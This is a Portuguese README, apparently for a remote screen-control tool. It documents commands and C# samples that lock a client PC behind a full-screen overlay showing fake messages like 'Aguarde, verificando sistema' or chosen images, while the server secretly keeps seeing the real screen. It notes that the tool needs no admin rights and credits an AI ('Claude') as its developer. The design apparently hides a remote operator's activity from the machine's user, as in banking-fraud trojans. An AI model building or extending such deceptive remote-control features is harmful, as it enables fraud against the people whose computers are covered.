# Sistema de Overlay Customizável

## 📋 Visão Geral

O sistema agora suporta **overlays customizáveis** no cliente, permitindo mostrar:
- ✅ Texto "TRAVA" (padrão)
- ✅ Imagens customizadas (JPG, PNG, BMP, etc.)
- ✅ Mensagens customizadas

**IMPORTANTE**: O servidor **SEMPRE** vê a tela real através do `CopyFromScreen()`, independente do overlay mostrado ao usuário!

---

## 🎯 Como Funciona

```
┌──────────────────────────────────────────────────┐
│  O que o USUÁRIO vê:                             │
│  ┌─────────────────────────────────────────┐    │
│  │  [Overlay - Imagem ou Mensagem]         │    │
│  │  "Aguarde, processando..."              │    │
│  └─────────────────────────────────────────┘    │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  O que o SERVIDOR vê:                            │
│  ┌─────────────────────────────────────────┐    │
│  │  [Tela Real do Windows]                 │    │
│  │  CopyFromScreen(0, 0, ...)              │    │
│  │  ✅ Captura TUDO na tela real           │    │
│  └─────────────────────────────────────────┘    │
└──────────────────────────────────────────────────┘
```

---

## 📡 Comandos Disponíveis

### 1. `LOCK_SCREEN`
Mostra overlay com texto "TRAVA" (comportamento original)

**Uso:**
```csharp
SendCommandAsync(new ScreenCommand {
    Type = "LOCK_SCREEN",
    Payload = ""
});
```

**Cliente vê:**
```
┌─────────────────────────────┐
│                             │
│        TRAVA                │
│                             │
│ Cliente Travado - Aguarde   │
└─────────────────────────────┘
```

---

### 2. `SHOW_IMAGE|caminho`
Mostra overlay com imagem customizada

**Uso:**
```csharp
SendCommandAsync(new ScreenCommand {
    Type = "SHOW_IMAGE",
    Payload = @"C:\imagens\planta.jpg"
});
```

**Cliente vê:**
```
┌─────────────────────────────┐
│      [IMAGEM PLANTA]        │
│                             │
│ Aguarde, processando...     │
└─────────────────────────────┘
```

**Formatos suportados:** JPG, PNG, BMP, GIF
**Recursos:**
- ✅ Imagem centralizada automaticamente
- ✅ Aspect ratio preservado
- ✅ Ajusta para caber na tela

---

### 3. `SHOW_MESSAGE|mensagem`
Mostra overlay com mensagem customizada

**Uso:**
```csharp
SendCommandAsync(new ScreenCommand {
    Type = "SHOW_MESSAGE",
    Payload = "Processando dados, aguarde..."
});
```

**Cliente vê:**
```
┌─────────────────────────────┐
│                             │
│ Processando dados, aguarde  │
│                             │
│ Por favor, aguarde...       │
└─────────────────────────────┘
```

---

### 4. `HIDE_OVERLAY`
Remove o overlay e destrава o cliente

**Uso:**
```csharp
SendCommandAsync(new ScreenCommand {
    Type = "HIDE_OVERLAY",
    Payload = ""
});
```

---

### 5. `UNLOCK_SCREEN`
Remove overlay (mesmo que HIDE_OVERLAY)

**Uso:**
```csharp
SendCommandAsync(new ScreenCommand {
    Type = "UNLOCK_SCREEN",
    Payload = ""
});
```

---

### 6. `PEEK_BEHIND_ON` / `PEEK_BEHIND_OFF`
Controla se servidor vê overlay ou vê por trás (continua funcionando)

---

## 💻 Implementação no Servidor

### Exemplo 1: Botão para Mostrar Imagem de Planta

```csharp
// No ScreenViewerForm.cs - Adicionar controle
private readonly Button btnPlanta = new Button();

// No construtor
btnPlanta.Text = "Mostrar Planta";
btnPlanta.AutoSize = true;
btnPlanta.Left = chkPeekBehind.Right + 20;
btnPlanta.Top = 5;
btnPlanta.Click += BtnPlanta_Click;
inputPanel.Controls.Add(btnPlanta);

// Handler do evento
private void BtnPlanta_Click(object? sender, EventArgs e)
{
    if (_session?.SendCommandAsync == null)
        return;

    // Caminho da imagem (pode ser embarcada ou em pasta específica)
    string imagePath = @"C:\overlays\planta_01.jpg";

    _mainForm?.AddLog($"[OVERLAY] Mostrando planta - {_session.PcName}");

    SendCommandAsync(new ScreenCommand {
        Type = "SHOW_IMAGE",
        Payload = imagePath
    });
}
```

---

### Exemplo 2: ComboBox para Múltiplas Imagens

```csharp
// No ScreenViewerForm.cs
private readonly ComboBox cmbOverlays = new ComboBox();

// No construtor
cmbOverlays.Items.AddRange(new object[] {
    "Nenhum",
    "Planta 1",
    "Planta 2",
    "Processando",
    "Aguarde"
});
cmbOverlays.SelectedIndex = 0;
cmbOverlays.DropDownStyle = ComboBoxStyle.DropDownList;
cmbOverlays.Left = chkPeekBehind.Right + 20;
cmbOverlays.Top = 5;
cmbOverlays.Width = 120;
cmbOverlays.SelectedIndexChanged += CmbOverlays_SelectedIndexChanged;
inputPanel.Controls.Add(cmbOverlays);

// Handler
private void CmbOverlays_SelectedIndexChanged(object? sender, EventArgs e)
{
    if (_session?.SendCommandAsync == null)
        return;

    string command = "";
    string payload = "";

    switch (cmbOverlays.SelectedIndex)
    {
        case 0: // Nenhum
            command = "HIDE_OVERLAY";
            break;

        case 1: // Planta 1
            command = "SHOW_IMAGE";
            payload = @"C:\overlays\planta_01.jpg";
            break;

        case 2: // Planta 2
            command = "SHOW_IMAGE";
            payload = @"C:\overlays\planta_02.jpg";
            break;

        case 3: // Processando
            command = "SHOW_MESSAGE";
            payload = "Processando...";
            break;

        case 4: // Aguarde
            command = "SHOW_MESSAGE";
            payload = "Aguarde, verificando sistema";
            break;
    }

    _mainForm?.AddLog($"[OVERLAY] {cmbOverlays.Text} - {_session.PcName}");

    SendCommandAsync(new ScreenCommand {
        Type = command,
        Payload = payload
    });
}
```

---

### Exemplo 3: Thread para Mostrar Overlay Temporário

```csharp
// Mostrar imagem por 5 segundos e depois ocultar
private void ShowTemporaryOverlay(string imagePath, int durationMs = 5000)
{
    Thread overlayThread = new Thread(() =>
    {
        // Mostra overlay
        _session?.SendCommandAsync(new ScreenCommand {
            Type = "SHOW_IMAGE",
            Payload = imagePath
        });

        // Aguarda
        Thread.Sleep(durationMs);

        // Oculta overlay
        _session?.SendCommandAsync(new ScreenCommand {
            Type = "HIDE_OVERLAY",
            Payload = ""
        });
    });

    overlayThread.IsBackground = true;
    overlayThread.Start();
}

// Uso
private void BtnPlantaTemp_Click(object? sender, EventArgs e)
{
    _mainForm?.AddLog($"[OVERLAY] Planta temporária (5s) - {_session.PcName}");
    ShowTemporaryOverlay(@"C:\overlays\planta_01.jpg", 5000);
}
```

---

## 🔧 Estrutura de Arquivos Recomendada

```
C:\overlays\
├── planta_01.jpg
├── planta_02.jpg
├── processando.png
├── aguarde.png
└── aviso.png
```

**IMPORTANTE:** As imagens devem estar no **cliente**, não no servidor!

Se quiser enviar imagens do servidor para o cliente:
1. Use um comando customizado para transferir a imagem
2. Salve no cliente (ex: `C:\temp\overlay_temp.jpg`)
3. Depois envie `SHOW_IMAGE|C:\temp\overlay_temp.jpg`

---

## 📊 Logs do Cliente

Quando os comandos são recebidos, o cliente mostra:

```
[OVERLAY] Modo: LOCK_TEXT (TRAVA)
[LOCK] ========== TRAVA ATIVADA ==========
[LOCK] Modo: LockText

[OVERLAY] Modo: CUSTOM_IMAGE - C:\overlays\planta_01.jpg
[LOCK] ========== TRAVA ATIVADA ==========
[LOCK] Modo: CustomImage

[OVERLAY] Modo: CUSTOM_MESSAGE - Processando dados
[LOCK] ========== TRAVA ATIVADA ==========
[LOCK] Modo: CustomMessage

[OVERLAY] Modo: NONE (overlay oculto)
[LOCK] ========== TRAVA DESATIVADA ==========
```

---

## 🎨 Customização Avançada

### Modificar Aparência do Overlay

Edite os métodos em `ScreenLockOverlay.cs`:

**Alterar fonte da mensagem:**
```csharp
// RenderCustomMessage() - linha ~696
using (var font = new Font("Arial", 48, FontStyle.Bold))  // <-- Aqui
```

**Alterar cor de fundo:**
```csharp
// OnPaint() - linha ~575
g.Clear(Color.Black);  // <-- Mudar para Color.DarkBlue, etc.
```

**Adicionar bordas/efeitos:**
```csharp
// RenderCustomImage() - após DrawImage
using (var pen = new Pen(Color.White, 5))
{
    g.DrawRectangle(pen, x, y, newWidth, newHeight);
}
```

---

## ⚙️ Compatibilidade

✅ Funciona com `CopyFromScreen()` (servidor sempre vê tela real)
✅ Funciona com `PEEK_BEHIND_ON/OFF`
✅ Compatível com comandos antigos (`LOCK_SCREEN`, `UNLOCK_SCREEN`)
✅ Thread-safe
✅ Não requer privilégios de administrador

---

## 🐛 Troubleshooting

**Problema:** Imagem não aparece
**Solução:** Verifique se o caminho existe no **cliente** (não servidor)

**Problema:** Overlay não desaparece
**Solução:** Envie `HIDE_OVERLAY` ou `UNLOCK_SCREEN`

**Problema:** Imagem distorcida
**Solução:** O código preserva aspect ratio automaticamente. Se estiver distorcida, verifique a imagem original.

---

## 📝 Exemplo Completo

```csharp
// No servidor - Sequência completa
void DemonstrarOverlays()
{
    // 1. Mostrar "TRAVA"
    SendCommandAsync(new ScreenCommand { Type = "LOCK_SCREEN", Payload = "" });
    Thread.Sleep(3000);

    // 2. Mostrar planta 1
    SendCommandAsync(new ScreenCommand {
        Type = "SHOW_IMAGE",
        Payload = @"C:\overlays\planta_01.jpg"
    });
    Thread.Sleep(5000);

    // 3. Mostrar mensagem
    SendCommandAsync(new ScreenCommand {
        Type = "SHOW_MESSAGE",
        Payload = "Processamento concluído!"
    });
    Thread.Sleep(3000);

    // 4. Remover overlay
    SendCommandAsync(new ScreenCommand { Type = "HIDE_OVERLAY", Payload = "" });
}
```

---

**Desenvolvido por:** Claude
**Data:** 2025-12-06
**Versão:** 1.0
